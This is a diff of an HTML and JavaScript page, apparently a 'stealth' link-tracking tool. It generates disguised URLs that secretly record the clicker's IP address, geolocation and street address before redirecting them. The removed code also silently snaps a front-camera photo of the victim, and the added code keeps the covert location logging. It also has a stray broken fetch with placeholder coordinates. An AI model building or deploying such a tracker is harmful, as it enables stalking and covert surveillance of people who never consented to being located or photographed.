@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealth URL Tracker</title>
+    <title>Advanced URL Tracker</title>
     <style>
         :root {
-            --primary: #4361ee;
-            --secondary: #3f37c9;
-            --danger: #f72585;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --gray: #6c757d;
-            --success: #4cc9f0;
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --danger: #ef4444;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --light: #f3f4f6;
+            --dark: #111827;
+            --gray: #6b7280;
         }
         
         * {
@@ -23,38 +24,37 @@
         }
         
         body {
-            background-color: #f5f7fa;
+            background-color: #f9fafb;
             color: var(--dark);
             line-height: 1.6;
+            padding: 20px;
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
         }
         
         header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
-            padding: 25px;
-            border-radius: 10px;
-            margin-bottom: 25px;
+            padding: 30px;
             text-align: center;
         }
         
-        .panel {
-            background: white;
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        .content {
+            padding: 30px;
         }
         
         .url-generator {
-            background-color: var(--light);
+            margin-bottom: 40px;
             padding: 20px;
+            background: var(--light);
             border-radius: 8px;
-            margin-bottom: 30px;
         }
         
         .input-group {
@@ -70,34 +70,71 @@
             font-size: 16px;
         }
         
-        button {
+        .input-group button {
             padding: 12px 20px;
             background-color: var(--primary);
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s;
+            font-size: 16px;
+            transition: background-color 0.3s;
         }
         
-        button:hover {
-            background-color: var(--secondary);
-            transform: translateY(-2px);
+        .input-group button:hover {
+            background-color: var(--primary-dark);
         }
         
-        .btn-danger {
-            background-color: var(--danger);
+        .result {
+            background-color: var(--light);
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
         }
         
-        .btn-success {
+        .url-display {
+            display: flex;
+            margin: 15px 0;
+        }
+        
+        .url-display input {
+            flex: 1;
+            padding: 10px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: white;
+        }
+        
+        .url-display button {
+            padding: 10px 15px;
             background-color: var(--success);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
         }
         
         .controls {
-            display: flex;
-            gap: 10px;
             margin-bottom: 20px;
+        }
+        
+        .controls button {
+            padding: 10px 15px;
+            margin-right: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        #refresh-btn {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        #clear-btn {
+            background-color: var(--danger);
+            color: white;
         }
         
         table {
@@ -114,20 +151,15 @@
         
         th {
             background-color: var(--light);
-            font-weight: 600;
-        }
-        
-        tr:hover {
-            background-color: #f8f9fa;
         }
         
         .modal {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -136,8 +168,8 @@
         
         .modal-content {
             background: white;
-            padding: 30px;
-            border-radius: 10px;
+            padding: 20px;
+            border-radius: 5px;
             max-width: 90%;
             max-height: 90%;
             overflow: auto;
@@ -146,69 +178,29 @@
         
         .close-modal {
             position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 24px;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
             cursor: pointer;
-            color: var(--gray);
         }
         
-        .camera-image {
-            max-width: 100%;
-            max-height: 80vh;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-        }
-        
-        .map-iframe {
+        .map-container {
             width: 100%;
             height: 500px;
-            border: none;
-            border-radius: 5px;
-        }
-        
-        .badge {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        
-        .badge-success {
-            background-color: #dcfce7;
-            color: #166534;
-        }
-        
-        .badge-danger {
-            background-color: #fee2e2;
-            color: #991b1b;
-        }
-        
-        .hidden-elements {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
+            margin-top: 15px;
         }
         
         @media (max-width: 768px) {
-            .input-group {
+            .input-group, .url-display {
                 flex-direction: column;
             }
             
-            .input-group input {
+            .input-group input, .url-display input {
                 margin-bottom: 10px;
             }
             
-            button {
+            .input-group button, .url-display button {
                 width: 100%;
-            }
-            
-            .controls {
-                flex-direction: column;
             }
         }
     </style>
@@ -217,72 +209,63 @@
     <div class="container">
         <header>
             <h1>Advanced URL Tracker</h1>
-            <p>Stealth tracking with camera capture & geolocation</p>
+            <p>Track clicks with location and camera capture</p>
         </header>
-        
-        <div class="panel">
+
+        <div class="content">
             <div class="url-generator">
-                <h2>Generate Tracking URL</h2>
+                <h2>Create Tracking URL</h2>
                 <div class="input-group">
                     <input type="text" id="target-url" placeholder="https://example.com">
-                    <button id="generate-btn">Generate</button>
+                    <button id="generate-btn">Generate Tracking URL</button>
                 </div>
-                <div id="result" style="margin-top: 15px;"></div>
+                <div class="result" id="tracking-result">
+                    <p>Your tracking URL:</p>
+                    <div class="url-display">
+                        <input type="text" id="tracking-url" readonly>
+                        <button id="copy-btn">Copy</button>
+                    </div>
+                </div>
             </div>
-            
-            <div class="controls">
-                <button id="refresh-btn">Refresh Data</button>
-                <button id="export-btn" class="btn-success">Export CSV</button>
-                <button id="clear-btn" class="btn-danger">Clear Data</button>
+
+            <div class="tracking-results">
+                <h2>Tracking Results</h2>
+                <div class="controls">
+                    <button id="refresh-btn">Refresh Data</button>
+                    <button id="clear-btn">Clear All Data</button>
+                </div>
+                <table id="results-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>IP Address</th>
+                            <th>Location</th>
+                            <th>Device</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="results-body">
+                        <!-- Results will appear here -->
+                    </tbody>
+                </table>
             </div>
-            
-            <table id="data-table">
-                <thead>
-                    <tr>
-                        <th>Timestamp</th>
-                        <th>IP Address</th>
-                        <th>Location</th>
-                        <th>Device</th>
-                        <th>Camera</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody></tbody>
-            </table>
         </div>
     </div>
 
-    <!-- Hidden elements for camera capture -->
-    <div class="hidden-elements">
-        <video id="camera-video" autoplay playsinline></video>
-        <canvas id="camera-canvas"></canvas>
-    </div>
-
     <script>
-    // Configuration
-    const TRACKING_PREFIX = window.location.origin + "/?track=";
-    let cameraStream = null;
-    
     // DOM Elements
-    const videoElement = document.getElementById('camera-video');
-    const canvasElement = document.getElementById('camera-canvas');
-    
-    // Initialize
-    document.addEventListener('DOMContentLoaded', function() {
-        loadTrackingData();
-        setupEventListeners();
-        checkForTrackingRequest();
-    });
-    
-    function setupEventListeners() {
-        document.getElementById('generate-btn').addEventListener('click', generateTrackingUrl);
-        document.getElementById('refresh-btn').addEventListener('click', loadTrackingData);
-        document.getElementById('export-btn').addEventListener('click', exportData);
-        document.getElementById('clear-btn').addEventListener('click', clearData);
-    }
-    
-    function generateTrackingUrl() {
-        const targetUrl = document.getElementById('target-url').value.trim();
+    const targetUrlInput = document.getElementById('target-url');
+    const generateBtn = document.getElementById('generate-btn');
+    const trackingResult = document.getElementById('tracking-result');
+    const trackingUrlInput = document.getElementById('tracking-url');
+    const copyBtn = document.getElementById('copy-btn');
+    const refreshBtn = document.getElementById('refresh-btn');
+    const clearBtn = document.getElementById('clear-btn');
+    const resultsBody = document.getElementById('results-body');
+
+    // Generate Tracking URL
+    generateBtn.addEventListener('click', function() {
+        const targetUrl = targetUrlInput.value.trim();
         
         if (!targetUrl) {
             alert('Please enter a URL');
@@ -297,236 +280,156 @@
         }
         
         const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
-        const trackingUrl = TRACKING_PREFIX + trackingId + "&target=" + encodeURIComponent(targetUrl);
+        const trackingUrl = window.location.origin + '/?track=' + trackingId + '&target=' + encodeURIComponent(targetUrl);
         
-        document.getElementById('result').innerHTML = `
-            <div style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
-                <p><strong>Tracking URL:</strong></p>
-                <input type="text" value="${trackingUrl}" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;" readonly>
-                <button onclick="copyToClipboard()">Copy URL</button>
-                <p style="margin-top: 10px; font-size: 14px; color: #666;">
-                    When someone clicks this link, it will silently capture their camera (if available) and redirect to the target URL.
-                </p>
-            </div>
-        `;
-    }
-    
-    function copyToClipboard() {
-        const input = document.querySelector('#result input');
-        input.select();
+        trackingUrlInput.value = trackingUrl;
+        trackingResult.style.display = 'block';
+        
+        // Save the tracking link
+        const trackingLinks = JSON.parse(localStorage.getItem('trackingLinks') || '{}');
+        trackingLinks[trackingId] = targetUrl;
+        localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
+    });
+
+    // Copy to Clipboard
+    copyBtn.addEventListener('click', function() {
+        trackingUrlInput.select();
         document.execCommand('copy');
         alert('URL copied to clipboard!');
-    }
-    
-    function loadTrackingData() {
-        const data = getTrackingData();
-        const tbody = document.querySelector('#data-table tbody');
+    });
+
+    // Load Tracking Results
+    function loadTrackingResults() {
+        const trackingData = JSON.parse(localStorage.getItem('trackingData') || '[]');
         
-        if (data.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6">No tracking data available</td></tr>';
+        if (trackingData.length === 0) {
+            resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
             return;
         }
         
-        tbody.innerHTML = data.map(item => `
+        resultsBody.innerHTML = trackingData.map(item => `
             <tr>
-                <td>${formatDate(item.timestamp)}</td>
+                <td>${new Date(item.timestamp).toLocaleString()}</td>
                 <td>${item.ip || 'Unknown'}</td>
                 <td>
-                    ${item.location ? `
-                        ${item.location.city || ''}${item.location.city && item.location.country ? ', ' : ''}
-                        ${item.location.country || ''}
-                        ${item.location.latitude ? `<span class="badge badge-success">${item.location.latitude}, ${item.location.longitude}</span>` : ''}
-                    ` : 'No location'}
+                    ${item.address ? item.address : ''}
+                    ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
                 </td>
-                <td>${getDeviceType(item.userAgent)}</td>
+                <td>${item.device || 'Unknown'}</td>
                 <td>
-                    ${item.cameraData ? '<span class="badge badge-success">Captured</span>' : '<span class="badge badge-danger">No capture</span>'}
-                </td>
-                <td>
-                    ${item.cameraData ? `<button onclick="showImage('${item.cameraData}')">View Photo</button>` : ''}
-                    ${item.location?.latitude ? `<button onclick="showMap(${item.location.latitude}, ${item.location.longitude})">View Map</button>` : ''}
+                    ${item.latitude ? `<button class="view-map" data-lat="${item.latitude}" data-lon="${item.longitude}">View Map</button>` : ''}
                 </td>
             </tr>
         `).join('');
-    }
-    
-    function formatDate(timestamp) {
-        return new Date(timestamp).toLocaleString();
-    }
-    
-    function getDeviceType(userAgent) {
-        if (/mobile/i.test(userAgent)) return 'Mobile';
-        if (/tablet/i.test(userAgent)) return 'Tablet';
-        return 'Desktop';
-    }
-    
-    function getTrackingData() {
-        return JSON.parse(localStorage.getItem('tracking_data') || []);
-    }
-    
-    function saveTrackingData(data) {
-        localStorage.setItem('tracking_data', JSON.stringify(data));
-    }
-    
-    function exportData() {
-        const data = getTrackingData();
-        let csv = 'Timestamp,IP Address,City,Country,Latitude,Longitude,Device,Target URL\n';
         
-        data.forEach(item => {
-            csv += `"${formatDate(item.timestamp)}","${item.ip || 'Unknown'}","${item.location?.city || ''}","${item.location?.country || ''}",` +
-                  `"${item.location?.latitude || ''}","${item.location?.longitude || ''}","${getDeviceType(item.userAgent)}","${item.target}"\n`;
+        // Add event listeners to map buttons
+        document.querySelectorAll('.view-map').forEach(button => {
+            button.addEventListener('click', function() {
+                showMap(this.dataset.lat, this.dataset.lon);
+            });
         });
-        
-        const blob = new Blob([csv], { type: 'text/csv' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `tracking-data-${new Date().toISOString().split('T')[0]}.csv`;
-        a.click();
     }
-    
-    function clearData() {
-        if (confirm('Are you sure you want to delete ALL tracking data? This cannot be undone.')) {
-            localStorage.removeItem('tracking_data');
-            loadTrackingData();
-        }
-    }
-    
-    function showImage(imageData) {
-        const modal = document.createElement('div');
-        modal.className = 'modal';
-        modal.innerHTML = `
-            <div class="modal-content">
-                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
-                <h3>Camera Capture</h3>
-                <img src="${imageData}" class="camera-image" alt="Camera capture">
-                <div style="margin-top: 15px;">
-                    <button onclick="downloadImage('${imageData}')">Download Image</button>
-                </div>
-            </div>
-        `;
-        document.body.appendChild(modal);
-    }
-    
+
+    // Show map modal
     function showMap(lat, lon) {
         const modal = document.createElement('div');
         modal.className = 'modal';
         modal.innerHTML = `
             <div class="modal-content">
-                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
+                <span class="close-modal">&times;</span>
                 <h3>Location Map</h3>
-                <iframe class="map-iframe" 
-                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
-                </iframe>
-                <div style="margin-top: 15px; text-align: center;">
+                <div class="map-container">
+                    <iframe
+                        width="100%"
+                        height="100%"
+                        frameborder="0"
+                        scrolling="no"
+                        marginheight="0"
+                        marginwidth="0"
+                        src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
+                    </iframe>
+                </div>
+                <small>
                     <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank">
                         View Larger Map
                     </a>
-                </div>
+                </small>
             </div>
         `;
+        
+        modal.querySelector('.close-modal').addEventListener('click', function() {
+            modal.remove();
+        });
+        
         document.body.appendChild(modal);
     }
-    
-    function downloadImage(imageData) {
-        const link = document.createElement('a');
-        link.href = imageData;
-        link.download = `capture-${Date.now()}.jpg`;
-        link.click();
-    }
-    
-    async function checkForTrackingRequest() {
-        const params = new URLSearchParams(window.location.search);
-        const trackingId = params.get('track');
-        const targetUrl = params.get('target');
-        
-        if (trackingId && targetUrl) {
-            const decodedUrl = decodeURIComponent(targetUrl);
-            
-            // Prepare tracking data
-            const trackingData = {
-                id: trackingId,
-                timestamp: new Date().toISOString(),
-                target: decodedUrl,
-                referrer: document.referrer || 'Direct',
-                userAgent: navigator.userAgent,
-                ip: 'Pending',
-                cameraData: null,
-                location: null
-            };
-            
-            try {
-                // Get IP and location data
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                
-                trackingData.ip = ipData.ip || 'Unknown';
-                
-                if (ipData.latitude && ipData.longitude) {
-                    trackingData.location = {
-                        latitude: ipData.latitude,
-                        longitude: ipData.longitude,
-                        city: ipData.city,
-                        country: ipData.country_name
-                    };
-                    
-                    // Get detailed address from Nominatim
-                    try {
-                        const nominatimResponse = await fetch(
-                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
-                        );
-                        const nominatimData = await nominatimResponse.json();
-                        
-                        if (nominatimData.address) {
-                            trackingData.location.address = nominatimData.address;
-                        }
-                    } catch (e) {
-                        console.error('Nominatim error:', e);
-                    }
-                }
-                
-                // Try camera capture
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    try {
-                        cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { facingMode: 'user' },
-                            audio: false 
-                        });
-                        
-                        videoElement.srcObject = cameraStream;
-                        await new Promise(resolve => videoElement.onloadedmetadata = resolve);
-                        
-                        // Wait for camera to initialize
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                        
-                        // Capture frame
-                        canvasElement.width = videoElement.videoWidth;
-                        canvasElement.height = videoElement.videoHeight;
-                        const ctx = canvasElement.getContext('2d');
-                        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                        
-                        trackingData.cameraData = canvasElement.toDataURL('image/jpeg', 0.7);
-                    } catch (e) {
-                        console.error('Camera error:', e);
-                    } finally {
-                        if (cameraStream) {
-                            cameraStream.getTracks().forEach(track => track.stop());
-                        }
-                    }
-                }
-            } catch (e) {
-                console.error('Tracking error:', e);
-            } finally {
-                // Save data
-                const allData = getTrackingData();
-                allData.unshift(trackingData);
-                saveTrackingData(allData);
-                
-                // Redirect to target URL
-                window.location.href = decodedUrl;
-            }
+
+    // Refresh Data
+    refreshBtn.addEventListener('click', loadTrackingResults);
+
+    // Clear Data
+    clearBtn.addEventListener('click', function() {
+        if (confirm('Are you sure you want to clear all tracking data?')) {
+            localStorage.removeItem('trackingData');
+            loadTrackingResults();
         }
+    });
+
+    // Check for tracking request
+    const params = new URLSearchParams(window.location.search);
+    const trackingId = params.get('track');
+    const targetUrl = params.get('target');
+    
+    if (trackingId && targetUrl) {
+        // Process tracking
+        const trackingData = {
+            timestamp: new Date().toISOString(),
+            target: decodeURIComponent(targetUrl),
+            referrer: document.referrer || 'Direct',
+            userAgent: navigator.userAgent,
+            device: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+        };
+
+        // Get IP and location data
+        Promise.all([
+            fetch('https://ipapi.co/json/').then(res => res.json()),
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=<LAT>&lon=<LON>&zoom=18&addressdetails=1`)
+        ])
+        .then(([ipData, nominatimRes]) => {
+            // Store IP data
+            trackingData.ip = ipData.ip;
+            trackingData.latitude = ipData.latitude;
+            trackingData.longitude = ipData.longitude;
+            
+            // Get detailed address from Nominatim
+            return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`)
+                .then(res => res.json())
+                .then(nominatimData => {
+                    if (nominatimData.address) {
+                        trackingData.address = [
+                            nominatimData.address.road || '',
+                            nominatimData.address.city || nominatimData.address.town || '',
+                            nominatimData.address.country || ''
+                        ].filter(Boolean).join(', ');
+                    }
+                    
+                    // Save to localStorage
+                    const allData = JSON.parse(localStorage.getItem('trackingData') || '[]');
+                    allData.unshift(trackingData);
+                    localStorage.setItem('trackingData', JSON.stringify(allData));
+                    
+                    // Redirect to target URL
+                    window.location.href = decodeURIComponent(targetUrl);
+                });
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = decodeURIComponent(targetUrl);
+        });
     }
+
+    // Initial load
+    loadTrackingResults();
     </script>
 </body>
 </html>
